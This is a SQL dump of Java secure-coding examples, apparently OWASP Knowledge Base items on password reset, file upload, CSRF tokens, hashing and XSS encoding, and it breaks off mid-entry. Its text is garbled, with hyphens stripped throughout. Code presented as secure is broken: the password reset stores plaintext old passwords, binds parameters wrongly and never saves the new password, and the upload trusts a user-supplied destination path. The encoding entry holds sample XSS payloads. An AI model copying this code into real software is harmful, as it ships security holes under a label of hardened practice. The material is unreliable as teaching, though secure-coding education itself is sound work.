    // Directory Listing configuration in web.xml 

    <servlet>
        <servletname>default</servletname>
        <servletclass>
        org.apache.catalina.servlets.DefaultServlet
        </servletclass>
        <initparam>
            <paramname>debug</paramname>
            <paramvalue>0</paramvalue>
        </initparam>
        <initparam>
            <paramname>listings</paramname>
            <paramvalue>false</paramvalue>    <! This setting enables/disables directory listings >
        </initparam>
        <loadonstartup>1</loadonstartup>
    </servlet>

    ', 'Disable Directory Listing', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password forget and disallow old passwords


 Example:


	/*
	Whenever you are developing a password forget function, these are the steps to follow
	in order to create hardened defenses.

	TABLE users
	
	| userID | userName | password |   EmailAddress   |    access    |
	   
	|   1    | Admin    | Csdar323 | info@admin.com  |     TRUE     |
	       
	|   2    | User     | Adf4fsv  | info@user.com   |     FALSE    |
	    
	|   3    | Guest    | dff4fKr  | info@guest.com  |     TRUE     |
	


	TABLE passwordForget
	   
	| forgotPasswordID |        Token            |  UserID |   Active   |     olPasswords   |
	
	|        1         |    c3ab8ff13720e....    |    1    |    YES     |      Csdar323     |
	
	|        2         |    7dd39466b3c89....    |    1    |    NO      |       ef0c4f2     |
	
	|        3         |    83d4a3960714c....    |    3    |    NO      |       dff4fKr     |
	


	As you can see we also store the old passwords into the password forget table, this
	we do in order to prevent the user from using old passwords later on in the process.

	Also use a CRON job to make sure the generated tokens for the password reset are
	expire after a certain amount of time like 20 minutes.
	*/


	package com.edw;

	import java.io.UnsupportedEncodingException;
	import java.security.InvalidKeyException;
	import java.security.NoSuchAlgorithmException;
	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class PasswordForget {

		final static Logger logger = Logger.getLogger(PasswordForget.class);
		private String password = "" ; 
		public int userID; 
		private Randomizer rand = new Randomizer();
		private String active = "";
		public String token = ""; 
		
		
		public String checkValidity(String email)
		{
			boolean emptyrows = false;
			String message = ""; 
			
			//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
			Connection conn = null;
			try {
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				String query = "SELECT * FROM members WHERE email = ?";
			
				//We bind the parameter in order to prevent sql injections
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, email);
				
				// execute the query, and get a java result set
				ResultSet rs = st.executeQuery();
				
				while (rs.next())
				{
					password  = rs.getString("password");
					userID 	= rs.getInt("userID");
					email 	= rs.getString("email");
				}
				
				//If the select was not empty we will be sending an email to the user as well as
				//preparing the password forget function
				if (rs.next() == false)
				{
					emptyrows = true; 	    	  
				}
				rs.close();
				
				if (emptyrows == true)
				{ 	  
					message = "An email was sent to reset your password";
					/*
					Before we do anything we first set all other possible active statuses to NO
					in order to prevent an attacker creating a whole lot of tokens than FUZZING 
					the password reset token. 
					*/
					active  = "NO";   
					String query2 = "UPDATE forgetPassword SET active= ? WHERE userID= ?";
					//We bind the parameter in order to prevent SQL injections
					PreparedStatement st2 = conn.prepareStatement(query2);    
					st2.setString(1, active);
					st2.setInt(2, userID);
					
					// execute the query, and get a java result set
					st2.executeQuery();
					st2.close();
					
					String query3 = "INSERT INTO forgetPassword"
							+ " (token, userID, active, oldPasswords)"
							+ " VALUES"
							+ " (?, ?, ?, ?)";

					//We bind the parameter in order to prevent SQL injections
					PreparedStatement st3 = conn.prepareStatement(query3);  
					//Here we generate the password forget token
					String token = rand.generateToken(30);
					st3.setInt(1, userID);
					st3.setString(2, token);
					st3.setInt(3, 1);
					st3.setString(4, password);
					
					// execute the query, and get a java result set
					st3.executeQuery();
					st3.close();
					//Here we send an email to the user with the needed reset function
					String msg = "follow this link to reset your password http://example.com/index.jsp?resetLink=$token";
					SendEmail mail = new SendEmail();
					mail.sendmail(email, "Password reset", msg);   
				}else{
					/*
					We show the user the same message in order to prevent the enumeration of
					valid email addresses.
					*/
					message = "An email was sent to reset your password";  
				}
				
				rs.close();
				st.close();
				conn.close();
			
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}
			return message; 
			//this return value can be used from SERVLETs in order to manipulate HTTP responses to send messages back to JSP pages  
		}

		public String resetPassword(String resetlink, String Password) throws InvalidKeyException, NoSuchAlgorithmException, UnsupportedEncodingException{
			Hashing hasher = new Hashing();
			String message = ""; 		
			/*
			Imagine the user clicked on his link with the token included and is redirected towards
			the page where he can enter his new password.
			
			Now we select the information from the forgot password function where the
			forgot tokens matches the token in the database.
			*/
			active = "YES"; 
			//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
			Connection conn = null;
			try {
				Context initContext = new InitialContext();
				Context webContext  = (Context)initContext.lookup("java:/comp/env");
				DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
				conn = ds.getConnection();	

				//Here we select the number of counts from aggregate column in order to verify the number of connections:
				String query = "SELECT  a.userID, a.token, b.id"
						+ " FROM forgetPassword as a "
						+ "JOIN members as b"
						+ " ON a.userID = b.id WHERE token=? and Active=? ";
			
				//We bind the parameter in order to prevent SQL injections
				PreparedStatement st = conn.prepareStatement(query);
				st.setString(1, resetlink);
				st.setString(2, active);
				
				// execute the query, and get a java result set
				ResultSet rs = st.executeQuery();
				
				while (rs.next())
				{
					token     = rs.getString("token");
					userID 	= rs.getInt("userID");
				}
				
				if (resetlink.equals(token))
				{
					/*
					First we pull the password through createSalt function which enforces the input of
					secure passwords.
					*/
					String oldpassword = ""; 	
					String salt = hasher.createSalt(Password);    	
					/*
					Then we encrypt the password 
					*/	    	
					String newpassword = hasher.hashPassword(salt, Password);
					
					/*
					Finally we compare the password against other old passwords from the 
					password reset database in order to prevent the user from using old passwords 
					which could already be compromised by any means.
					*/

					//Here we select the number of counts from aggregate column in order to verify the number of connections:
					String query2 = "SELECT oldPasswords FROM forgetPassword where userID = ?";
				
					//We bind the parameter in order to prevent SQL injections
					PreparedStatement st2 = conn.prepareStatement(query2);
					st2.setInt(1, userID);
					// execute the query, and get a java result set
					ResultSet rs2 = st2.executeQuery(); 
					while (rs2.next())
					{
						oldpassword = rs2.getString("oldPasswords");
					}
					
					if (newpassword.equals(oldpassword))
					{
						message = "This was an old password please do not use this password";	
					}else{
						active = "NO";
						
						//First we update the new password for the user
						String query3 ="UPDATE members SET password=? WHERE userID=?";
						
						//We bind the parameter in order to prevent SQL injections
						PreparedStatement st3 = conn.prepareStatement(query3);	
						st3.setInt(1, userID);
						
						// execute the query, and get a java result set
						st3.executeQuery();
						
						//First we update the new password for the user
						String query4 ="UPDATE forgetPassword SET active=? WHERE userID=?";
						
						//Then we destroy the reset token by setting it''s value to NO
						PreparedStatement st4 = conn.prepareStatement(query4);
						st4.setString(1, active);
						st4.setInt(2, userID); 
						
						// execute the query, and get a java result set
						st4.executeQuery();  
						
						rs2.close();
						st2.close();
						st3.close();
						st4.close();
						conn.close();
					}
					st2.close();    
				}
				st.close();
				conn.close();   
			} catch (SQLException | NamingException e) {
				logger.error("cannot search database. check query" + e.toString() );
			}
			return message; //this return value can be used from SERVLETs in order to manipulate HTTP responses to send messages back to JSP pages 
		}	
	}

', 'Password forget and disallow old passwords', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Timeout Sessions 


 Example:


    /*
    Within your web.xml you can configure your session idle timeout.
    The default time is set to 20 minutes.
    */

    <webapp>
    ...
      <sessionconfig>
        <sessiontimeout>20</sessiontimeout> <! in minutes >
      </sessionconfig>
    </webapp>

', 'Timeout Sessions', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory Path traversal


 Example:


    package com.edw;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import com.edw.InputValidation;
    import com.edw.WhiteList;
    import org.apache.log4j.Logger;

    public class Rewrite extends HttpServlet
    {

        private static final long serialVersionUID = 1L;
        private File getFile;
        /**
        * @see HttpServletHttpServlet()
        */
        public Rewrite() {
            super();
        }
        
        final static Logger logger = Logger.getLogger(Rewrite.class);
        
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
        {
            InputValidation validate = new InputValidation();
            WhiteList listme = new WhiteList();

            /*
            First, we want to filter the filenames for expected values. For this example we use only use 09
            Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.           
            */
            boolean validated = true;

            //see the "input validation" code example for more detailed information about this function
            
            final boolean validInput = validate.validateInput(getFile.toString(), "numeric", "Failed to get file", "HIGH");
            
            if (!validInput) { 
                validated = false; 
            }
            /*
            see the "WhiteListing" code example for more detailed information about this function
            Let''s assume there are three files named 1,2,3
            */

            if (listme.WhiteListing("1,2,3", getFile.toString()) == false) { validated = false; }

            //Only if the pattern was true we allow the variable into the streamreader function
            if (validated)
            {
                String canonicalPath = getFile.getCanonicalPath();
                if (!canonicalPath.equals("C:\\....\\WEBINF" + getFile)) 
                {
                    // Invalid file; handle error
                }            	 
                FileInputStream fis = new FileInputStream(canonicalPath);            	
            }else{
                logger.error("invalid user input was detected!");              
            }
            doGet(request,response);
        }
        
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            response.getWriter().append("Served at: ").append(request.getContextPath()).append("  OWASP Knowledge Base Code Examples");
        }
    }
', 'Directory path traversal attack', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Logout 


 Example:


	package com.edw;

	import java.io.IOException;
	import javax.servlet.ServletException;
	import javax.servlet.annotation.WebServlet;
	import javax.servlet.http.Cookie;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;

	/*
	 Servlet implementation class Logout
	*/
	@WebServlet("/Logout")
	public final class Logout extends HttpServlet {
		private static final long serialVersionUID = 1L;
		
		/**
		* @see HttpServletHttpServlet()
		*/
		public Logout() {
			super();
		}

		/**
		* @see HttpServletdoGet(HttpServletRequest request, HttpServletResponse response)
		*/
		protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			response.getWriter().append("Served at: ").append(request.getContextPath());
		}

		/**
		* @see HttpServletdoPost(HttpServletRequest request, HttpServletResponse response)
		*/
		protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
			
			request.getSession().invalidate();
			request.getSession().setAttribute("Authenticated", "");
			
			Cookie cookie = null;
			Cookie[] cookies = null;
			// Get an array of Cookies associated with this domain
			cookies = request.getCookies();
				
			for (Cookie cookie2 : cookies) {
				cookie = cookie2;
				
				if (cookie.getName().equals("JSESSIONID"))
				{        	 
					cookie.setValue("");
				}
			
				response.addCookie(null);
				request.setAttribute("msg","Session terminated!");
				request.getRequestDispatcher("/login.jsp").forward(request, response);
				return;
			}
		}
	}
', 'Logout', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce Secure Password


 Example:


    package com.edw;

    import java.io.BufferedReader;
    import java.io.FileReader;
    import java.io.IOException;
    import java.util.regex.Matcher;
    import java.util.regex.Pattern;

    import org.apache.log4j.Logger;

    public final class PasswordCheck {
        
        final static Logger logger = Logger.getLogger(PasswordCheck.class);
        
        public boolean checkPassword(String password)
        {
            
            String error = "";
            boolean complete = true;
            
            /*
            for example here we define the expected value''s for your password.
            
            ^                  startofstring
            (?=.*[09])        a digit must occur at least once
            (?=.*[az])        a lower case letter must occur at least once
            (?=.*[AZ])        an upper case letter must occur at least once
            (?=.*[@$%^&+=])   a special character must occur at least once
            (?=\S+$)           no whitespace allowed in the entire string
            .{8,}              anything, at least eight places though
            $                  endofstring
            */
            
            String validation = "^(?=.*[09])(?=.*[az])(?=.*[AZ])(?=.*[@$%^&+=])(?=\S+$).{8,}$";    

            // Create a Pattern object
            Pattern reg = Pattern.compile(validation);
            // Now create matcher object.
            Matcher match = reg.matcher(password);
            if (!match.find()) {	
                error = "You did not enter a valid password";
                complete = false;  
            }

            /*
            Also we have to take into consideration that Password1! is a valid password according to password standards. This however is not the case since this password is included in almost every dictionary attack mechanisms. So we have to prevent the user from using these weak passwords. In such case we will define these bad passwords in a text 
            file in order to compare the user''s password with the list of bad passwords inside that file.
            */
            
            try {
                BufferedReader in = new BufferedReader(new FileReader("C:\\Users\\Public\\xml\\test.txt"));
                String[] strTemp = null ;
                String line;
                
                while((line = in.readLine()) != null)
                {                
                    strTemp = line.split(",");
                }
                
                for (String value : strTemp)
                {	 
                    if (value.equals(password))
                    {
                        error = "Your password was a bad password!";
                        complete = false;
                    }          
                }
                in.close();
            }
            catch(IOException e) {
                logger.error(e.toString());
            }
        
            //The last step is checking the password length to see if it is 8 characters or bigger
            if (password.length() < 8)
            {
                error = "The password was to short";
                complete = false;
            }

            if (complete)
            {
                //Do further operation
                return true;
            }else{
                return false;
            }
        }
    }

', 'Enforce secure password', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' File Uploading 


 Example:


    /*
    In this example we show the steps that must be taken in order to upload a file securely. The main steps are input validation ,file extension checks and mime type checks. 
    the following code snipet shows the jsp page that performs the post action to upload a certain file to destination 
    */

    <%@ page language="java" contentType="text/html; charset=ISO88591" pageEncoding="ISO88591"%>
    <!DOCTYPE html PUBLIC "//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
        <head>
            <title>File Upload</title>
            <meta httpequiv="ContentType" content="text/html; charset=UTF8">
        </head>
        <body>
            <form method="post" action="FileUpload" enctype="multipart/formdata" >
                File:
                <input type="file" name="file" id="file" /> <br/>
                Destination:
                <input type="text" value="C:\Users\someuser\Desktop\test" name="destination"/>
                </br>
                <input type="submit" value="Upload" name="upload" id="upload" />
            </form>
            <%
            String message =  " "; 
            message = (String) request.getAttribute("msg");
            if (message == null)
            {
                message = " ";
            }
            out.println(" " + message);
            %> 
        </body>
    </html>


    // The following code snippet performs the file uploading functionality from the post action performed at the jsp page showed above


    package com.edw;
    import java.io.File;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.io.PrintWriter;
    import java.lang.reflect.InvocationTargetException;
    import java.time.LocalDateTime;
    import java.util.List;
    import org.apache.log4j.Logger;

    import javax.servlet.RequestDispatcher;
    import javax.servlet.ServletException;
    import javax.servlet.annotation.MultipartConfig;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import javax.servlet.http.Part;
    import com.Lib.AuditLog;
    import com.Lib.WinRegistry;
    import com.Lib.InputValidation;

    import org.apache.commons.io.FilenameUtils;

    @MultipartConfig
    public final class FileUpload extends HttpServlet {
        
        /**
        * 
        */
        private static final long serialVersionUID = 1L;
        final static Logger logger = Logger.getLogger(FileUpload.class);
        private AuditLog Log = new AuditLog(); 
        InputValidation validate = new InputValidation();

        //We check for form submit
    
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
        {
            response.setContentType("text/html;charset=UTF8");
            String userID = request.getSession().getAttribute("userID");
            boolean continueFunction = true;
            boolean sessionTermination = false;
            boolean blockAccess = false ;
            
            // Create path components to save the file
            // The location of stored files should always be outside of your root
            
            // the destination path used to store the file gotten from the POST parameter
            
            final String path = request.getParameter("destination");
            final File f = new File(path);
            final Part filePart = request.getPart("file");
            //We get the filename for doing different types of tests on it
            final String fileName = getFileName(filePart);
        
            /*
            First we check if the value is alphanumeric only to prevent uploading out of intended directory, 
            as wel as other injections
            */
            
            if (validate.validateInput(userID, fileName, "alphanumeric", "validation failed",request.getRemoteAddr(),"HIGH").equals("validation failed"))
            {
                continueFunction = false;
            }
            
            else if (validate.validateInput(userID, fileName, "alphanumeric", "Session Termination",request.getRemoteAddr(),"HIGH").equals("terminate"))
            {
                request.getSession().invalidate();
                continueFunction = false;
                sessionTermination=true;
            }   
            
            else if (validate.validateInput(userID, fileName, "alphanumeric", "Block access",request.getRemoteAddr(),"HIGH").equals("block"))
            {
                continueFunction = false;
                blockAccess=true;
            }else{
                Log.SetLog(userID, "Validated Successfully" , "SUCCESS", LocalDateTime.now(),request.getRemoteAddr(),  "");           
            }
            
            /*
            The next step would be checking if the file contains the right extension in order to prevent
            a user from uploading files which could be used to harm your system. in this example 
            we check if the last extension found in the file name is a jpg or a png. whenever
            an application just regexes for the extension an attacker could
            bypass the check by uploading an file like: "filename.jpg.php".
            */       
            
            String  fileExtension = FilenameUtils.getExtension(fileName);

            if (!fileExtension.equals("jpg") && !fileExtension.equals("png") )
            {
                continueFunction = false;
            }

            /*
            If the file came through all the different checks, it is time to upload the file to your system. 
            */
            if (continueFunction == true)
            {       
                OutputStream out = null;
                InputStream filecontent = null;

                //start uploading the file
                try {
                    out = new FileOutputStream(new File(path + File.separator + fileName));
                    filecontent = filePart.getInputStream();

                    int read = 0;
                    final byte[] bytes = new byte[1024];

                    while ((read = filecontent.read(bytes)) != 1) {
                        out.write(bytes, 0, read);
                    }
                            
                    logger.info("File" + fileName + "has been uploaded to" + path); 
                    
                } catch (FileNotFoundException fne) {

                    logger.error("Problems during file upload. Error:" + fne.toString());
                
                } finally {
                    if (out != null) {
                        out.close();
                    }
                    if (filecontent != null) {
                        filecontent.close();
                    }
                }
            }
            
            /*
            Now we check the uploaded file for the right mimetype
            We do this after the upload instead of checking the content type header since that header 
            can easily manipulated by an attacker. 
            */
                    
            List<String> ls = null;
            String key = null;
            try {
                ls = WinRegistry.readStringSubKeys(WinRegistry.HKEY_LOCAL_MACHINE,"SOFTWARE\\Classes\\");
                key = ls.stream().filter(st > st.matches("."+StrSpli)).findAny().orElse(null);
                
            } catch (IllegalArgumentException | IllegalAccessException | InvocationTargetException e) {
                logger.error("Problems during file upload. Error: " + e.toString());
            }
            
            
            String mimeType = "application/unknown";
            try {
                mimeType = WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\"+key, "Content Type");
            } catch (IllegalArgumentException | IllegalAccessException | InvocationTargetException e) {
                logger.error("Problems reading the extension value on Windows registry. Error: " + e.toString());
            }

            if (mimeType == null || !mimeType.equals("image/jpeg"))
            {
                //If the mimetype is not valid we delete the file from the system.
                f.delete();
                continueFunction = false;                
            }  

            if (continueFunction == false && sessionTermination == false && blockAccess == false)
            {    
                request.setAttribute("msg","FAIL! file has not been uploaded");	
                RequestDispatcher dd = request.getRequestDispatcher("/FileUpload.jsp");
                dd.forward(request, response);			    
                return;		   
            }
            
            if (continueFunction == true && sessionTermination == false && blockAccess == false)
            {
                request.setAttribute("msg","SUCCESS! file uploaded");
                request.getRequestDispatcher("/FileUpload.jsp").forward(request, response);
                return;
            }      
                    
            if (continueFunction == false && sessionTermination == false && blockAccess == true)
            {  
                request.setAttribute("msg","Access Blocked!");
                request.getRequestDispatcher("/error.jsp").forward(request, response);
                return;
            }
            
            if (continueFunction == false && sessionTermination == true && blockAccess == false)
            {  
                request.getSession().invalidate();
                request.setAttribute("msg","Session terminated!");
                request.getRequestDispatcher("/error.jsp").forward(request, response);
                return;
            }       
        }

    @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

            super.doGet(req, resp);
        }

        /*
        reading from headers 
        ...
        POST /fileupload/upload HTTP/1.1
        Host: localhost:8080
        ContentType: multipart/formdata; 
        boundary=263081694432439
        ContentLength: 441
        263081694432439
        ContentDisposition: formdata; name="file"; filename="sample.txt"
        ContentType: text/plain
        [ ..... ]
        */

        private String getFileName(final Part part)
        {
            final String partHeader = part.getHeader("contentdisposition");
            logger.info("Part Header = " + partHeader)
            
            for (String content : part.getHeader("contentdisposition").split(";"))
            {
                if (content.trim().startsWith("filename"))
                {
                    return content.substring(content.indexOf(''='') + 1).trim().replace("\"", "");
                }
            }
            return null;
        }   
    }


', 'File uploading', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF Tokens  JSF


 Example:


	/*

	For CSRF tokens we used a separate class outside of the normal controller, since
	it must be reused on several locations throughout the application

	After a successful validation of a user login, the application must also start a session
	which contains the "cross site request forgery" token.

	From the Randomizer class we are generating the token we want by using a secure cryptographic function
	SecureRandom csprng = new SecureRandom();

	Then we generate a long value token containing a high entropy
	byte[] randomBytes  = new byte[128];

	prng.nextBytes(randombytes);

	Then we base64 encode the string
	String csrfToken = Base64.getEncoder().encodeToString(randomBytes);

	Then we set the session attribute.

	origRequest.getSession(false);
	origRequest.getSession().setAttribute("CSRF", csrfToken);

	The next step is to implement this random token in each form field as a hidden input parameter
	and send it to a function which checks if the submitted token is equal to the one set after successful validation.

	The following .xhtml snippet shows the code used to place the antiCSRF token inside the page.
	When the page renders, the <cu:antiCSRF/> is created as a viewstate encoded html input tag
	which then carries the antiCSRF token.
	While in process of rendering the page, a new token is generated
	and added into the existing session.
	When the user press the commandButton
	then CSRF token parameter is compared with the CSRF session parameter. 

	*/


	/*
	<f:view contentType="text/html">    
	<f:event listener="{userLoginView.isAuthenticated}" type="preRenderView" />
	[ .... ]

	<p:commandButton action="password?facesredirect=true" value="Add User" ajax="false">
	<cu:antiCSRF/>
	</p:commandButton>
	</h:form>

	[ .... ]

	/* 

	the following function used to generate the new Session which then is added to the already existing session. 

	*/


	public void generateToken(){
			
			HttpServletRequest origRequest = (HttpServletRequest)FacesContext.getCurrentInstance().getExternalContext().getRequest();

			//we include the random password/token class.
			Randomizer CSRF = new Randomizer();
			/*
			Now we create a random value for our CSRF tokens. See "Random password token generation" in
			the code examples for more detailed information:
			*/
			String CSRftoken = CSRF.generate(25);
					
			//Set an accessor session.
			origRequest.getSession(false);
			origRequest.getSession().setAttribute("CSRF", CSRftoken);
		}

	/* 
	the following function used to destroy the cookie and invalidate the session when the CSRF tokens dont match 
	*/

		public void antiCSRF() throws IOException
		{	

			ExternalContext externalContext = FacesContext.getCurrentInstance().getExternalContext();
			HttpServletRequest origRequest = (HttpServletRequest)externalContext.getRequest();
			HttpServletResponse origResponse = (HttpServletResponse)externalContext.getResponse();
			String AUTH_KEY =  (String) externalContext.getSessionMap().get("AUTH_KEY");
			externalContext.getSessionMap().remove(AUTH_KEY);
			externalContext.invalidateSession();
			
			// Get an array of Cookies associated with this domain
			Cookie[] cookies = origRequest.getCookies();		         
			for (Cookie cookie : cookies) 
			{	         
					if ("JSSESIONID".equalsIgnoreCase(cookie.getName()))
					{        	 
						cookie.setValue(null);	       		
						origResponse.addCookie(cookie);
					
						Log.SetLog("", "", "Cookie has been destroyed!", LocalDateTime.now(), "", "");    
					} 
			}		     
		}

	/* 
	This function used to decode the viewstate and get the token value from the html input tag. Also it performs token comparison between the antiCSRF token values of the html component and the session attribute. If the comparison fails then the session must be invalid.

	*/ 
			public void decode(FacesContext context) {
				FacesContext fc = FacesContext.getCurrentInstance();

				// access the hidden input field value
				ExternalContext external = context.getExternalContext();
				Map<?, ?> requestMap = external.getRequestParameterMap();
				String value = String.valueOf(requestMap.get("_CSRFToken"));

				// access the session and get the token
				HttpSession session = (HttpSession) external.getSession(false);
				String token = (String) session.getAttribute("CSRF");

				// check if the token exists
				if (value == null || "".equals(value)) {
					try {
						this.antiCSRF();
					} catch (IOException e) {
						logger.error(e.toString());
					}
					Log.SetLog("", "", "antiCSRF token doesn''t match! Failed attempt", "", "NULL"); 
					logger.info("antiCSRF token doesn''t match! Failed attempt");
					ConfigurableNavigationHandler nav = (ConfigurableNavigationHandler) fc.getApplication().getNavigationHandler(); 
					nav.performNavigation("csrf");
				}

				// check the values for equality
				if (!value.equalsIgnoreCase(token)) {
					try {
						this.antiCSRF();
					} catch (IOException e) {
						logger.error(e.toString());
					}
					Log.SetLog("", "", "antiCSRF token doesn''t match! Failed attempt", "", "NULL"); 
					logger.info("antiCSRF token doesn''t match! Failed attempt");
					ConfigurableNavigationHandler nav = (ConfigurableNavigationHandler) fc.getApplication().getNavigationHandler(); 
					nav.performNavigation("UserLogin");
				}
			}

	/*
	the following function used to encode the viewstate with the html tag into a jsf component 
	*/ 

	@Override public void encodeEnd(FacesContext context) throws IOException 
	{
		//generate new token in every request
		this.generateToken();
		// get the session (don''t create a new one!)
		HttpSession session = (HttpSession) context.getExternalContext().getSession(false);
		// get the token from the session
		String token = (String) session.getAttribute("CSRF");
		// write the component HTML to the response
		ResponseWriter responseWriter = context.getResponseWriter();
		responseWriter.startElement("input", null);
		responseWriter.writeAttribute("type", "hidden", null);
		responseWriter.writeAttribute("name", "_CSRFToken", "");
		responseWriter.writeAttribute("value", token, "CSRF");
		responseWriter.endElement("input");
	}

	*/
    
', 'CSRF Token JSF', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Sandboxing


 Example:


    <iframe sandbox="value">

    /*
    sandbox=""  Applies all restrictions
    allowforms  Reenables form submission
    allowpointerlock  Reenables APIs
    allowpopups  Reenables popups
    allowsameorigin  Allows the iframe content to be treated as being from the same origin
    allowscripts  Reenables scripts
    allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context
    */
', 'Sandboxing', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Hashing


 Example:


	package com.Lib;

	import java.io.UnsupportedEncodingException;
	import java.security.InvalidKeyException;
	import java.security.NoSuchAlgorithmException;
	import java.security.SecureRandom;
	import org.apache.commons.codec.binary.Base64;
	import org.apache.log4j.Logger;

	public class Hashing {

		final static Logger logger = Logger.getLogger(Hashing.class);
		
		public String createSalt(String password) throws NoSuchAlgorithmException, InvalidKeyException, UnsupportedEncodingException
		{
			/*
			For generating the random salt we want to use a secure cryptographic function
			*/
			
			SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
			//Create array for salt
			byte[] salt = new byte[128];
			//Get a random salt
			sr.nextBytes(salt);
			//return salt		
			
			/**
			* RFC 2898 password derivation compatible with .NET Rfc2898DeriveBytes class.
			*/
			Rfc2898DeriveBytes hasher = new Rfc2898DeriveBytes(password, salt, 10000);
			String bencoded = new String(Base64.encodeBase64(hasher.GetBytes(25)));
			return bencoded;	
		}
		
		//The salt in this function is the return value of the createSalt function
		public String hashPassword(String Salt, String Password)
		{
			Rfc2898DeriveBytes Hasher = null;
			try {
				Hasher = new Rfc2898DeriveBytes(Password + "ALongPepperValue",Salt.getBytes(), 10000);
			} catch (InvalidKeyException | NoSuchAlgorithmException | UnsupportedEncodingException e) {
				logger.error("error in hashing password!" + e.toString());
			}
			String bencoded = new String(Base64.encodeBase64(Hasher.GetBytes(25)));
			return bencoded;
		}

		//With this function we validate the password hash
		public boolean Validate(String passwordHash, String saltHash, String enteredPassword)
		{
			Rfc2898DeriveBytes Hasher = null;
			try {
				Hasher = new Rfc2898DeriveBytes(enteredPassword + "ALongPepperValue",saltHash.getBytes(), 10000);
			} catch (InvalidKeyException | NoSuchAlgorithmException | UnsupportedEncodingException e) 
				logger.error("Validation error in hashing password!" + e.toString());
			}
			String bencoded = new String(Base64.encodeBase64(Hasher.GetBytes(25)));
			if (bencoded.equals(passwordHash))
				return true;
			return false;
		}
	}

', 'Hashing', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HTML encoding


 Example:

				
	/*
	Whenever user input is displayed in the application all user input should be properly escaped 
	to prevent XSS injections.
	*/

	/*
	This escaping is used whenever you put the code straight into the html like:
	<span>YOUR USER INPUT</span>
	The attack bellow will now be outputted as,
	&lt;script&gt;alert(1337);&lt;/script&gt;
	*/

	import org.owasp.esapi.ESAPI;
	import org.owasp.esapi.errors.EncodingException;

	String htmlbug = ESAPI.encoder().encodeForHTML("<script>alert(1337);</script>");

	/*
	This next encoding method is used whenever you are allowing user input into 
	html attributes.
	The attack below will now be outputted as:
	onload=&amp;39;alert(1337)&amp;39;
	*/
			
	String htmlatr = ESAPI.encoder().encodeForHTMLAttribute("onload=''alert(1337);''");
			
	/*
	Whenever parameters are rendered via javascript your application will detect normal injections
	in the first instant. in order for the application not to be vulnerable to javascrpt encoding you MUST use the encodeForJavaScript function, any other escaping function still leaves your code vulnerable
	*/	      

	ESAPI.encoder().encodeForJavaScript("\\x3Cscript\\x3Ealert(12);\\x3C\\x2Fscript\\x3E");
			
	/*
	Whenever a user can submit an link/AHREF in your application you must solely depend upon the
	"ESAPI.encoder().encodeForURL" method since an attacker could otherwise inject the href with an XSS
	that looks like this "javacript:alert("XSS");" whenever a victim now clicks the link this XSS
	will be executed in his browser.
	*/ 

	try {
		ESAPI.encoder().encodeForURL("javascript:alert(234);");
	} catch (EncodingException e) {
		logger.error("Error encoding characters : " + e.toString() + " Time : " + LocalDateTime.now());
	}

	/*
	Security consists of different layers of protection in order to guarantee the integrity
	of your application. This means that the value displayed from the database/user should
	already be sanitized before being processed in order to prevent XSS.

	As an example, what do you do when you expect a numeric value from your application?

	you first sanitize the user input by means of an input validation method like:
	See the "input validation" class for the entire example!
	*/
	InputValidation validate = new InputValidation();
	String userinput = "when this string is evil the application will block operation!";
	if(validate.validateInput(userinput, "numeric", "Unexpected user input", "HIGH", 3)== false)
	{ /* Cancel operation of your application */ }
			
	/*
	In this example the application cancelled the request by means of simple validation.
	*/
    
', 'HTML encoding', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anticlickjacking


 Example:


    /*
    One way to defend against clickjacking is to include a "framebreaker" script in each 
    page that should not be framed. The following methodology will prevent a webpage from 
    being framed even in legacy browsers, that do not support the XFrameOptionsHeader.

